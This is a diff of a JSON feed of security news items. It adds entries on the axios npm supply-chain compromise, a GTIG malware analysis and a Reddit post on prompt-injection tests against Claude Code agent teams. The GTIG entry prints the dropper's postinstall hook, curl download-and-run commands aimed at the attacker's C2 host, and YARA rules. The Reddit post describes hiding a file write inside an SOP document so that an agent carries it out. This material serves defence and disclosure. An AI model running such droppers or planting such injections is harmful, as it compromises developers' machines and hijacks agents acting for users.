@@ -1,7 +1,7 @@
 {
-  "generated_at": "2026-03-31T22:00:19.454165+00:00",
+  "generated_at": "2026-03-31T23:00:01.689076+00:00",
   "days_back": 30,
-  "total_items": 8214,
+  "total_items": 8228,
   "items": [
     {
       "title": "Black Hat USA",
@@ -12,6 +12,117 @@
       "type_label": "General Security & Blogs",
       "published": "2026-08-01T11:00:00+00:00",
       "published_ts": 1785582000,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "axios got hijacked for 3 hours today - here's what the advisories aren't telling you about container images already running in production",
+      "summary": "Earlier today, two malicious versions of axios (the most popular JS HTTP client, 100M+ weekly npm downloads) were published via a hijacked maintainer account. Versions 1.14.1 and 0.30.4 included a hidden dependency that deployed a cross-platform RAT to any machine that ran npm install during a three-hour window (00:21\u201303:29 UTC). The malicious versions have since been pulled. The security advisories so far focus on checking lockfiles and running SCA scans against source repos. But if you're running Kubernetes, there's a gap that's easy to miss: container images. If any image in your K8s clusters was built between 00:21 and 03:29 UTC today, the build may have pulled the compromised version. That image is now deployed and running regardless of whether you've since fixed your lockfile. npm ci protects future builds \u2014 it doesn't fix images that are already running in production. Things worth checking beyond your lockfile: Scan running container images , not just source repos. grype | grep axios or syft -o json | jq for the affected versions Check for the RAT IOCs on nodes : /Library/Caches/com.apple.act.mond (macOS), %PROGRAMDATA%\\wt.exe (Windows), /tmp/ld.py (Linux) Check network egress for connections to 142.11.206.73:8000 (the C2). If you run Cilium with Hubble: hubble observe --to-ip 142.11.206.73 --verdict FORWARDED Block the C2 in your network policies and DNS blocklists now If you find affected pods, rotate every secret those pods had access to \u2014 service account tokens, mounted credentials, everything. The RAT had arbitrary code execution Also worth noting: if any of your Dockerfiles use npm install instead of npm ci , they ignore the lockfile entirely and pull whatever's latest. That's how a three-hour window becomes your problem. Worth grepping your Dockerfiles for that. Full writeup with specific kubectl commands for checking clusters: https://juliet.sh/blog/axios-npm-supply-chain-compromise-finding-it-in-your-kubernetes-clusters submitted by /u/Remarkable-Gurrrr [link] [comments]",
+      "link": "https://www.reddit.com/r/cybersecurity/comments/1s92qa7/axios_got_hijacked_for_3_hours_today_heres_what/",
+      "source": "/r/cybersecurity",
+      "type": "osint",
+      "type_label": "OSINT, Communities & Subreddits",
+      "published": "2026-03-31T22:46:37+00:00",
+      "published_ts": 1774997197,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Windows / Microsoft",
+        "Linux / Unix",
+        "Cloud / SaaS",
+        "Web / API Security"
+      ],
+      "curated": true
+    },
+    {
+      "title": "These Shark Amazon Spring Sale deals are perfect for a spring refresh - but hurry",
+      "summary": "Amazon's Big Spring Sale ends today, but there's still plenty of savings from Shark (including hair tools, cleaning gear, and more) - but don't wait.",
+      "link": "https://www.zdnet.com/article/shark-amazon-spring-sale-2026-deals-last-chance/",
+      "source": "ZDNet \u2013 Security",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-03-31T22:32:34+00:00",
+      "published_ts": 1774996354,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "GIGABYTE Control Center vulnerable to arbitrary file write flaw",
+      "summary": "The GIGABYTE Control Center is vulnerable to an arbitrary file-write flaw that could allow a remote, unauthenticated attacker to access files on vulnerable hosts. [...]",
+      "link": "https://www.bleepingcomputer.com/news/security/gigabyte-control-center-vulnerable-to-arbitrary-file-write-flaw/",
+      "source": "BleepingComputer",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-03-31T22:28:02+00:00",
+      "published_ts": 1774996082,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "Anthropic accidentally leaks Claude Code",
+      "summary": "Anthropic accidentally exposed Claude Code source via npm, causing the code to quickly spread online after discovery. Anthropic accidentally leaked the source code of its Claude Code tool after a large debug file was included in a public npm release. The file exposed over 500,000 lines of code, which were quickly discovered, shared, and analyzed [\u2026]",
+      "link": "https://securityaffairs.com/190229/data-breach/anthropic-accidentally-leaks-claude-code.html",
+      "source": "Security Affairs",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-03-31T22:23:49+00:00",
+      "published_ts": 1774995829,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs"
+      ],
+      "curated": true
+    },
+    {
+      "title": "These 5 Amazon Spring Sale deals are worth a second glance before they're gone soon",
+      "summary": "It's the last day of Amazon's Big Spring Sale, but there's still last chance savings on top gear from Dyson (including vacuums, hair tools, and more).",
+      "link": "https://www.zdnet.com/article/dyson-amazon-spring-sale-2026-deals-still-live/",
+      "source": "ZDNet \u2013 Security",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-03-31T22:19:07+00:00",
+      "published_ts": 1774995547,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "Opensource OreWatch: Continuous monitoring for malicious packages - detect Axious and LiteLLM compromise and future compromises",
+      "summary": "We started with OreNPMGuard \u2014 a simple npm-focused tool. It was useful, but it didn't take long to realize this isn't an npm-only problem, and you don't solve it with static indicator files you have to manually update. The Axios npm compromise, the Trivy GitHub Actions tag hijack, the LiteLLM backdoor \u2014 same pattern every time. Trusted package, trusted tag, trusted workflow, compromised release path. The code people actually review isn't always where the compromise lives. This is getting worse. With more LLM-assisted development happening, dependencies show up that we might not be aware. Packages get pulled in, workflows get changed, and half the time nobody fully remembers why something was added because they weren't writing every line themselves. So we took OreNPMGuard and turned it into OreWatch \u2014 multi-ecosystem, local-first, fed by automated threat intel instead of static lists that go stale in a week. It runs in the background and catches the stuff that's easy to miss. The whole point: this problem isn't going away, and devs need something watching while they're building. PyPI: https://pypi.org/project/orewatch/1.1.1/ Tell me where it helps, where it breaks, and what's missing. That's the feedback I actually want. submitted by /u/PerceptionOk8748 [link] [comments]",
+      "link": "https://www.reddit.com/r/cybersecurity/comments/1s920vf/opensource_orewatch_continuous_monitoring_for/",
+      "source": "/r/cybersecurity",
+      "type": "osint",
+      "type_label": "OSINT, Communities & Subreddits",
+      "published": "2026-03-31T22:18:01+00:00",
+      "published_ts": 1774995481,
+      "smart_groups": [
+        "Curated",
+        "Ransomware",
+        "Vulnerabilities / CVEs",
+        "Malware / Payloads"
+      ],
+      "curated": true
+    },
+    {
+      "title": "Passed OSCP First Try with Minimal Prep",
+      "summary": "Hey everyone, I just passed OSCP on my first try and rooted all the standalone machines and the AD set. Honestly, I thought it\u2019d be a nightmare. My prep was pretty light: I ran through labs A/B/C, read about 40% of the PWK guide, and watched 4-5 S1ren videos the night before the exam. That\u2019s it! There\u2019s a ton of buzz about grinding a gazillion boxes before you sit the exam, but what really helped me was sticking to a clear methodology, notetaking and emotional intelligence. My 2 cents: don\u2019t overthink it, keep solid notes, and if still don\u2019t have a clear methodology, dive into S1ren vids - in my opinion they are way more important than tjnull list. Cheers submitted by /u/capella_24 [link] [comments]",
+      "link": "https://www.reddit.com/r/cybersecurity/comments/1s91ckt/passed_oscp_first_try_with_minimal_prep/",
+      "source": "/r/cybersecurity",
+      "type": "osint",
+      "type_label": "OSINT, Communities & Subreddits",
+      "published": "2026-03-31T21:51:33+00:00",
+      "published_ts": 1774993893,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "Texas Lt. Gov. lists crypto, prediction markets in charges for lawmakers",
+      "summary": "The #2 Texas state official called on lawmakers to study \u201cthe sudden inundation of prediction market gambling\u201c as other jurisdictions take the platforms to court.",
+      "link": "https://cointelegraph.com/news/texas-dan-patrick-crypto-prediction-markets-senate?utm_source=rss_feed&utm_medium=rss&utm_campaign=rss_partner_inbound",
+      "source": "Cointelegraph.com News",
+      "type": "crypto",
+      "type_label": "Crypto & Blockchain Security",
+      "published": "2026-03-31T21:48:00+00:00",
+      "published_ts": 1774993680,
       "smart_groups": [],
       "curated": false
     },
@@ -28,6 +139,21 @@
         "Identity / Access"
       ],
       "curated": false
+    },
+    {
+      "title": "Claude AI finds Vim, Emacs RCE bugs that trigger on file open",
+      "summary": "Vulnerabilities in the Vim and GNU Emacs text editors, discovered using simple prompts with the Claude assistant, allow remote code execution simply by opening a file. [...]",
+      "link": "https://www.bleepingcomputer.com/news/security/claude-ai-finds-vim-emacs-rce-bugs-that-trigger-on-file-open/",
+      "source": "BleepingComputer",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-03-31T21:45:14+00:00",
+      "published_ts": 1774993514,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs"
+      ],
+      "curated": true
     },
     {
       "title": "This minimalist smartwatch by one of my favorite tech companies is under $100 right now",
@@ -54,6 +180,20 @@
       "curated": false
     },
     {
+      "title": "Wall Street moves benchmarks onchain as S&P tokenizes Treasury index",
+      "summary": "S&P Dow Jones Indices puts its iBoxx US Treasuries Index on the Canton Network, allowing institutions to access bond benchmark data through tokens rather than feeds.",
+      "link": "https://cointelegraph.com/news/sp-tokenizes-treasury-index-canton-network?utm_source=rss_feed&utm_medium=rss&utm_campaign=rss_partner_inbound",
+      "source": "Cointelegraph.com News",
+      "type": "crypto",
+      "type_label": "Crypto & Blockchain Security",
+      "published": "2026-03-31T21:33:58+00:00",
+      "published_ts": 1774992838,
+      "smart_groups": [
+        "Crypto / Web3"
+      ],
+      "curated": false
+    },
+    {
       "title": "Iran Threatens to Start Attacking Major US Tech Firms on April 1",
       "summary": "Tech giants like Apple, Google, and Microsoft are among those on a target list released by Iran\u2019s Islamic Revolutionary Guard Corps.",
       "link": "https://www.wired.com/story/iran-threatens-to-start-attacking-major-us-tech-firms-on-april-1/",
@@ -62,6 +202,18 @@
       "type_label": "General Security & Blogs",
       "published": "2026-03-31T21:25:12+00:00",
       "published_ts": 1774992312,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "New North Korean AI Hiring Scheme Targets US Companies",
+      "summary": "North Korean operatives are using AI-generated resumes and stolen identities to infiltrate US companies, turning hiring pipelines into a new attack vector. The post New North Korean AI Hiring Scheme Targets US Companies appeared first on TechRepublic .",
+      "link": "https://www.techrepublic.com/article/news-north-korean-ai-hiring-scheme-us-companies/",
+      "source": "TechRepublic \u2013 Security",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-03-31T21:19:19+00:00",
+      "published_ts": 1774991959,
       "smart_groups": [],
       "curated": false
     },
@@ -633,6 +785,20 @@
       "curated": true
     },
     {
+      "title": "axios supply chain attack: how to remediate at scale!?",
+      "summary": "Usually post here about SOC automation stuff so this is a bit off my normal beat, but a friend pulled me into this and I figured this community would have opinions. He's a dev lead, caught the axios compromise from yesterday (v1.14.1 and v0.30.4, maintainer account hijacked, plain-crypto-js dropped a RAT that self-destructed after execution). His team confirmed they didn't actually execute the malicious versions so no full incident response needed, but they do have the affected versions sitting in lockfiles across 30+ repos that need cleaning up. His plan right now is to write a script to grep lockfiles across repos, flag the bad versions, pin everything back to the safe version, and go one by one. Which will work, but feels like a lot of repetitive overhead. Curious how other orgs handle this at scale. Do you just eat the toil? Intern project? Something smarter I'm not thinking of, or is the script approach just the right answer at this scale and there's nothing meaningfully better? submitted by /u/CybersecurityWizKid [link] [comments]",
+      "link": "https://www.reddit.com/r/cybersecurity/comments/1s8wzir/axios_supply_chain_attack_how_to_remediate_at/",
+      "source": "/r/cybersecurity",
+      "type": "osint",
+      "type_label": "OSINT, Communities & Subreddits",
+      "published": "2026-03-31T19:12:51+00:00",
+      "published_ts": 1774984371,
+      "smart_groups": [
+        "Curated"
+      ],
+      "curated": true
+    },
+    {
       "title": "How SentinelOne\u2019s AI EDR Autonomously Discovered and Stopped Anthropic\u2019s Claude from Executing a Zero Day Supply Chain Attack, Globally",
       "summary": "Read our blog post to learn how SentinelOne\u2019s AI EDR autonomously stopped a global LiteLLM supply chain attack before execution.",
       "link": "https://www.sentinelone.com/blog/how-sentinelones-ai-edr-autonomously-discovered-and-stopped-anthropics-claude-from-executing-a-zero-day-supply-chain-attack-globally/",
@@ -961,6 +1127,21 @@
       "published_ts": 1774980000,
       "smart_groups": [],
       "curated": false
+    },
+    {
+      "title": "We ran live prompt injection tests against Claude Code's multi-agent system. Here's what we found \u2014 and why the same gaps exist in every major framework.",
+      "summary": "This is our second paper. The first analyzed 159 production MCP servers and found 3,143 security findings no per-tool auth, ambient credentials, tools with delete access and no constraints. This paper goes one layer up: the agents calling those tools have no cryptographic identity either. We spent the day doing live behavioral testing on Claude Code Agent Teams, then expanded the analysis to AutoGen, CrewAI, LangGraph, and OpenAI Agents SDK. Same four structural auth gaps in all of them. The four gaps (every framework, no exceptions): Agent identity is a display name string \u2014 `researcher@my-team`. No cryptographic material. Any process can impersonate any agent. Sub-agents inherit parent credentials without scoping at delegation Agent-to-agent messages are unsigned plaintext. The `from` field is self-declared. No verification. No mechanism to constrain a sub-agent's tool access when it's spawned What we actually demonstrated: DoS via false attribution: Injected messages claiming to be from a legitimate agent caused the orchestrator to terminate the real agent. The payload never needed to execute false attribution alone caused the damage. End-to-end injection: SOP document with a file write buried as step 3.5 of 6 procedural steps. Written to look like a normal internal procedure document. Clean-slate Claude Code session with no prior injection context. The analyst read the SOP, did legitimate security work (found 4 real findings including a hardcoded webhook secret), and reached step 3.5. The orchestrator wrote the injected file. The user had approved \"write audit log and close ticket\" without seeing the specific path the approval UI shows task summaries, not raw tool parameters. Why model safety training doesn't fully close this: In our 8-test poisoned session, the model caught everything it accumulates suspicion context and identified our campaign as coordinated by test 4. But a fresh session with an injection that looks like the natural conclusion of legitimate work is a different problem. The model's safety training flags things that look like injections. It has no reliable defense against injections embedded as workflow completion steps. Production CVEs for context: CVE-2025-68664 (LangChain Core CrewAI (CVSS 9.2, disclosed by Noma Security): Ambient credential inheritance converted exception handler bug into admin GitHub token leak across all private repos These aren't bugs in a specific product. This is the default design pattern: inter-agent security is deferred to the application layer. Same root cause at the tool layer, same root cause at the orchestration layer. Full paper with industry comparison matrix, fix schemas, and detailed PoC: https://github.com/stevenkozeniesky02/agentsid-scanner/blob/master/docs/agent-teams-auth-gap-2026.md First paper (MCP server analysis): https://github.com/stevenkozeniesky02/agentsid-scanner/blob/master/docs/state-of-agent-security-2026.md submitted by /u/Accurate_Mistake_398 [link] [comments]",
+      "link": "https://www.reddit.com/r/cybersecurity/comments/1s8uses/we_ran_live_prompt_injection_tests_against_claude/",
+      "source": "/r/cybersecurity",
+      "type": "osint",
+      "type_label": "OSINT, Communities & Subreddits",
+      "published": "2026-03-31T17:55:19+00:00",
+      "published_ts": 1774979719,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs"
+      ],
+      "curated": true
     },
     {
       "title": "US indicts Maryland man for 2021 theft of $54 million from Uranium Finance",
@@ -1368,6 +1549,22 @@
         "Curated",
         "Vulnerabilities / CVEs",
         "Exploit / PoC"
+      ],
+      "curated": true
+    },
+    {
+      "title": "North Korean hackers blamed for hijacking popular Axios open source project to spread malware",
+      "summary": "A hacker inserted malware in Axios, an open source web tool downloaded tens of millions of times weekly, in a widespread hack.",
+      "link": "https://techcrunch.com/2026/03/31/hacker-hijacks-axios-open-source-project-used-by-millions-to-push-malware/",
+      "source": "Security News | TechCrunch",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-03-31T16:01:11+00:00",
+      "published_ts": 1774972871,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Malware / Payloads"
       ],
       "curated": true
     },
@@ -1848,6 +2045,18 @@
       "curated": false
     },
     {
+      "title": "Health data giant CareCloud says hackers accessed patients&#8217; medical records",
+      "summary": "CareCloud, a major provider of medical records storage, said hackers accessed one of its repositories of patient data earlier in March. It provides technology for more than 45,000 providers covering millions of patients.",
+      "link": "https://techcrunch.com/2026/03/31/carecloud-breach-hackers-accessed-patients-medical-records-ehr/",
+      "source": "Security News | TechCrunch",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-03-31T14:50:02+00:00",
+      "published_ts": 1774968602,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
       "title": "EvilTokens ramps up device code phishing targeting Microsoft 365 users",
       "summary": "Security researchers report a notable increase in device code phishing activity aimed at Microsoft 365 users, and have attributed this rise to the availability of EvilTokens, a new, specialized phishing toolkit that\u2019s being offered as-a-service via Telegram. What is device code phishing? Device code phishing is a type of attack where attackers trick users into logging into their account by using a real authentication flow, then steal their access and refresh tokens. Microsoft provides the \u2026 More \u2192 The post EvilTokens ramps up device code phishing targeting Microsoft 365 users appeared first on Help Net Security .",
       "link": "https://www.helpnetsecurity.com/2026/03/31/eviltokens-phishing-microsoft-365/",
@@ -1987,6 +2196,29 @@
       "published_ts": 1774965610,
       "smart_groups": [],
       "curated": false
+    },
+    {
+      "title": "North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack",
+      "summary": "Written by: Austin Larsen, Dima Lenz, Adrian Hernandez, Tyler McLellan, Christopher Gardner, Ashley Zaya, Michael Rudden Introduction Google Threat Intelligence Group (GTIG) is tracking an active software supply chain attack targeting the popular Node Package Manager (NPM) package \" axios .\" Between March 31, 2026, 00:21 and 03:20 UTC, an attacker introduced a malicious dependency named \" plain-crypto-js \" into axios NPM releases versions 1.14.1 and 0.30.4. Axios is the most popular JavaScript library used to simplify HTTP requests, and these packages typically have over 100 million and 83 million weekly downloads, respectively. This malicious dependency is an obfuscated dropper that deploys the WAVESHAPER.V2 backdoor across Windows, macOS, and Linux. GTIG attributes this activity to UNC1069 , a financially motivated North Korea-nexus threat actor active since at least 2018, based on the use of WAVESHAPER.V2 , an updated version of WAVESHAPER previously used by this threat actor . Further, analysis of infrastructure artifacts used in this attack shows overlaps with infrastructure used by UNC1069 in past activities . This blog details the attack lifecycle, from the initial account compromise to the deployment of operating system (OS)-specific payloads, and provides actionable guidance for defenders to identify and mitigate this threat. Campaign Overview On March 31, 2026, GTIG observed the introduction of plain-crypto-js version 4.2.1 as a dependency in the legitimate axios package version 1.14.1. Analysis indicates the maintainer account associated with the axios package was compromised, with the associated email address changed to an attacker-controlled account ( ifstap@proton.me ). The threat actor used the postinstall hook within the \" package.json\" file of the malicious dependency to achieve silent execution. Upon installation of the compromised axios package, NPM automatically executes an obfuscated JavaScript dropper named \" setup.js\" in the background. \"scripts\": { \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\", \"postinstall\": \"node setup.js\" } Malware Analysis The plain-crypto-js package serves as a payload delivery vehicle. The core component, SILKBELL, setup.js (SHA256: e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09 ), dynamically checks the target system's operating system upon execution to deliver platform-specific payloads. The script uses a custom XOR and Base64-based string obfuscation routine to conceal the command-and-control (C2 or C&C) URL and host OS execution commands. To evade static analysis, it dynamically loads fs , os , and execSync . After successfully dropping the secondary payload, setup.js attempts to delete itself and revert the modified package.json to hide forensic traces of the postinstall hook. Operating System-Specific Execution Paths Depending on the identified platform, the dropper executes the following routines. Windows The dropper actively hunts for the native powershell.exe binary. To evade detection, it copies the legitimate executable to %PROGRAMDATA%\\wt.exe . It then downloads a PowerShell script via curl using the POST body packages.npm.org/product1 and saves it to the user's AppData Temp directory (e.g., %TEMP%\\6202033.ps1 ). The payload is executed using a copied Windows Terminal executable with hidden and execution policy bypass flags. Set objShell = CreateObject(\"WScript.Shell\") objShell.Run \"cmd.exe /c curl -s -X POST -d packages.npm.org/product1 http://sfrclak[.]com:8000/6202033 > %TEMP%\\6202033.ps1 & %PROGRAMDATA%\\wt.exe -w hidden -ep bypass -file %TEMP%\\6202033.ps1 http://sfrclak[.]com:8000/6202033 & del \"\"PS_PATH\"\" /f\", 0, False macOS The malware uses bash and curl to download a native Mach-O binary payload to /Library/Caches/com.apple.act.mond using the POST body packages.npm.org/product0 . It modifies permissions to make the file executable and launches it via zsh in the background. try do shell script \" curl -o /Library/Caches/com.apple.act.mond -d packages.npm.org/product0 -s http://sfrclak.com:8000/6202033 && chmod 770 /Library/Caches/com.apple.act.mond && /bin/zsh -c \"/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &\" &> /dev/null\" \" end try do shell script \"rm -rf tmp/6202033\" Linux The script downloads a Python backdoor to /tmp/ld.py using the POST body packages.npm.org/product2 . Cleanup Aside from removing downloaded scripts in two execution branches, the script attempts to remove itself and replace an injected package.json with an original one, which was stored as \" package.md \". const K = __filename; t.unlink(K, (x => {})) t.unlink('package.json', (x => {})), t.rename('package.md', 'package.json', ord) WAVESHAPER.V2 Backdoor Capabilities The platform-specific payloads ultimately deploy variants of a backdoor tracked by GTIG as WAVESHAPER.V2, a backdoor written in C++ that targets macOS to collect system information, enumerate directories, or execute additional payloads and that connects to the C2 provided via command-line arguments. Notably, GTIG identified additional variants of WAVESHAPER.V2 written in PowerShell and Python to target diverse environments. Regardless of the operating system, the malware beacons to the C2 endpoint over port 8000 at 60-second intervals. The beacon consists of Base64-encoded JSON data and uses a hard-coded User-Agent: mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0) Following the initial beaconing to the adversary infrastructure, WAVESHAPER.V2 continuously polls, pausing for 60 seconds awaiting instructions. The server response determines the next action taken by the implant. The backdoor supports multiple commands outlined in the Table 1. Command Description kill Terminates the malware's execution process. rundir Retrieves detailed directory listings, including file paths, sizes, and creation/modification timestamps for paths specified in the ReqPaths parameter. runscript Decodes and executes a provided AppleScript payload. peinject Decodes, drops, and executes an arbitrary binary payload with optional parameters. Table 1: WAVESHAPER.V2 commands On Windows, persistence is achieved by creating a hidden batch file ( %PROGRAMDATA%\\system.bat ) and adding a new entry named MicrosoftUpdate to HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run to launch it at logon. WAVESHAPER.V2 acts as a fully functional RAT with the following capabilities: Reconnaissance: Extracts system telemetry, including hostname, username, boot time, time zone, OS version, and detailed running process lists. Command Execution: Supports multiple execution methods, including in-memory Portable Executable (PE) injection and arbitrary shell commands. The shell execution command expects a script and script parameters from C2; if no script is provided, the parameter is executed as a PowerShell command, but if a script is provided, it is either Base64-encoded or placed into a file depending on its size. File System Enumeration: Returns detailed metadata for requested target directories by continuously recursing through the file system. Attribution GTIG attributes this activity to UNC1069 , a financially motivated North Korea-nexus threat actor active since 2018. Analysis of the C2 infrastructure ( sfrclak[.]com resolving to 142.11.206.73 ) revealed connections from a specific AstrillVPN node previously used by UNC1069. Additionally, adjacent infrastructure hosted on the same ASN has been historically linked to UNC1069 operations. Furthermore, WAVESHAPER.V2 is a direct evolution of WAVESHAPER , a macOS and Linux backdoor previously attributed to UNC1069. While the original WAVESHAPER uses a lightweight, raw binary C2 protocol and employs code packing, WAVESHAPER.V2 communicates using JSON, collects additional system information, and supports more backdoor commands. Despite these upgrades, both versions accept their C2 URL dynamically via command-line arguments, share identical C2 polling behaviors and an uncommon User-Agent string, and deploy secondary payloads to identical temporary directories (e.g., /Library/Caches/com.apple.act.mond ). Outlook and Implications The impact of this attack by North Korea-nexus actors is broad and has ripple effects as other popular packages rely on axios as a dependency. Notably, UNC1069 isn\u2019t the only threat actor that has launched successful open source supply chain attacks in recent weeks. UNC6780 (also known as TeamPCP) recently poisoned GitHub Actions and PyPI packages associated with projects like Trivy, Checkmarx, and LiteLLM to deploy the SANDCLOCK credential stealer and facilitate follow-on extortion operations. Hundreds of thousands of stolen secrets could potentially be circulating as a result of these recent attacks. This could enable further software supply chain attacks, software as a service (SaaS) environment compromises (leading to downstream customer compromises), ransomware and extortion events, and cryptocurrency theft over the near term. Supply chain compromise is a particularly dangerous tactic because it abuses the inherent trust that users and enterprise administrators place in hardware, software, and updates supplied by reputable vendors as well as the trust they may not realize they are placing in collaborative code-sharing communities. Defenders should pay close attention to these campaigns, and enterprises should initiate dedicated efforts to assess the existing impact, remediate compromised systems, and harden environments against future attacks. Remediation GTIG urges all developers and organizations using the axios package to take immediate corrective action. Priority should be given to auditing dependency trees for compromised versions, isolating affected hosts, and rotating any potentially exposed secrets or credentials. Following initial containment, organizations must implement long-term hardening through strict version pinning and enhanced supply-chain monitoring. Version Control: Do not upgrade to axios version 1.14.1 or 0.30.4. Ensure corporate-managed NPM repositories are configured to serve only known-good versions (e.g., 1.14.0 or earlier; 0.30.3 or earlier). Dependency Pinning: Pin axios to a known safe version in your package-lock.json to prevent accidental upgrades. Malicious Package Audit: Inspect project lockfiles specifically for the 'plain-crypto-js' package (versions 4.2.0 or 4.2.1). Use tools like Wiz or Open Source Insights for deeper dependency auditing. Pipeline Security: Pause CI/CD deployments for any package relying on axios. Validate that builds are not pulling \"latest\" versions before redeploying with pinned, safe versions. Incident Response: If plain-crypto-js is detected, assume the host environment is compromised. Revert the environment to a known-good state and rotate all credentials or secrets present on that machine. Network Defense: Block all traffic to sfrclak[.]com and the command & control IP: 142.11.206.73. Monitor and alert on any endpoint communication attempts to this domain. Cache Remediation: Clear local and shared npm, yarn, and pnpm caches on all workstations and build servers to prevent re-infection during subsequent installs. Endpoint Protection: Deploy EDR to protect developer environments. Monitor for suspicious processes spawning from Node.js applications that match known Indicators of Compromise (IOCs). Credential Management: Rotate all tokens and API keys used by applications confirmed to have run indicators of compromise (IOCs). Developer Sandboxing & Secret Vaulting : Isolate development environments in containers or sandboxes to restrict host filesystem access, and migrate plaintext secrets to the OS keychain using aws-vault . This ensures compromised packages cannot programmatically scrape credentials or execute malicious scripts directly on the host machine. Indicators of Compromise (IOCs) To assist the wider community in hunting and identifying the activity outlined in this blog post, we have included IOCs in a free GTI Collection for registered users. Network Indicators Indicator Type Notes 142.11.206.73 C2 WAVESHAPER.V2 sfrclak[.]com C2 WAVESHAPER.V2 http://sfrclak[.]com:8000 C2 WAVESHAPER.V2 http://sfrclak[.]com:8000/6202033 C2 WAVESHAPER.V2 23.254.167.216 C2 Suspected UNC1069 Infrastructure File Indicators Family Notes SHA256 WAVESHAPER.V2 Linux Python RAT fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf WAVESHAPER.V2 macOS Native Binary 92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a WAVESHAPER.V2 Windows Stage 1 617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101 WAVESHAPER.V2 N/A ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c SILKBELL N/A e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09 N/A system.bat f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd N/A plain-crypto-js-4.2.1.tgz 58401c195fe0a6204b42f5f90995ece5fab74ce7c69c67a24c61a057325af668 YARA Rules These rules may be most useful on developer workstations, CI/build systems, and other suspected impacted hosts for retrospective hunting and validation. rule G_Backdoor_WAVESHAPER.V2_PS_1 { meta: description = \"Detects the WAVESHAPER.V2 PowerShell backdoor which communicates with C2 via base64 encoded JSON beacons and supports PE injection and script execution\" author = \"GTIG\" md5 = \"04e3073b3cd5c5bfcde6f575ecf6e8c1\" date_created = \"2026/03/31\" date_modified = \"2026/03/31\" rev = 1 platforms = \"Windows\" family = \"WAVESHAPER.V2\" strings: $ss1 = \"packages.npm.org/product1\" ascii wide nocase $ss2 = \"Extension.SubRoutine\" ascii wide nocase $ss3 = \"rsp_peinject\" ascii wide nocase $ss4 = \"rsp_runscript\" ascii wide nocase $ss5 = \"rsp_rundir\" ascii wide nocase $ss6 = \"Init-Dir-Info\" ascii wide nocase $ss7 = \"Do-Action-Ijt\" ascii wide nocase $ss8 = \"Do-Action-Scpt\" ascii wide nocase condition: uint16(0) != 0x5A4D and filesize rule G_Hunting_Downloader_suspected_UNC1069_PS_1 { meta: description = \"Detects PowerShell dropper associated with suspected UNC1069 and Axios npm package supply chain attack. Associated to WAVESHAPER.V2\" author = \"GTIG\" md5 = \"089e2872016f75a5223b5e02c184dfec\" date_created = \"2026/03/31\" date_modified = \"2026/03/31\" rev = 1 platforms = \"Windows\" strings: $ss1 = \"start /min powershell -w h\" ascii wide nocase $ss2 = \"[scriptblock]::Create([System.Text.Encoding]::UTF8.GetString\" ascii wide nocase $ss3 = \"Invoke-WebRequest -UseBasicParsing\" ascii wide nocase $ss4 = \"-Method POST -Body\" ascii wide nocase $ss5 = \"packages.npm.org/product1\" ascii wide nocase condition: uint16(0) != 0x5A4D and filesize rule G_Hunting_Downloader_SILKBELL_1 { meta: description = \"Detects the obfuscated version of the JS NPM supply chain downloader using Base64 obfuscation and custom XOR. Associated with WAVESHAPER.V2\" author = \"GTIG\" md5 = \"7658962ae060a222c0058cd4e979bfa1\" date_created = \"2026/03/31\" date_modified = \"2026/03/31\" rev = 1 platforms = \"Any\" strings: $ss1 = \"OrDeR_7077\" ascii wide fullword $ss2 = \"String.fromCharCode(S^a^333)\" ascii wide $ss3 = \"\\\"TE9DQUw^\\\".replaceAll(\\\"^\\\",\\\"=\\\")\" ascii wide $ss4 = \"\\\"UFM_\\\".replaceAll(\\\"_\\\",\\\"=\\\")\" ascii wide $ss5 = \"\\\"U0NSXw--\\\".replaceAll(\\\"-\\\",\\\"=\\\")\" ascii wide $ss6 = \"\\\"UFNfQg--\\\".replaceAll(\\\"-\\\",\\\"=\\\")\" ascii wide $ss7 = \"\\\"d2hlcmUgcG93ZXJzaGVsbA((\\\".replaceAll(\\\"(\\\",\\\"=\\\")\" ascii wide condition: uint16(0) != 0x5A4D and filesize Google Security Operations (SecOps) Google Security Operations (SecOps) customers have access to the following broad category rules and more under the Mandiant Intel Emerging Threats rule pack. Curl Writing Apple System File to Staging Directory Node Spawning Nohup Osascript Node Spawning Windows Script Host With Delete Command Windows Script Host Spawning Shell With Curl Windows Terminal In Suspicious Staging Directory Wiz Wiz customers should check their Wiz Threat Center for information on this advisory and whether or not they are impacted. For more information refer to Wiz\u2019s blog post, Axios NPM Distribution Compromised in 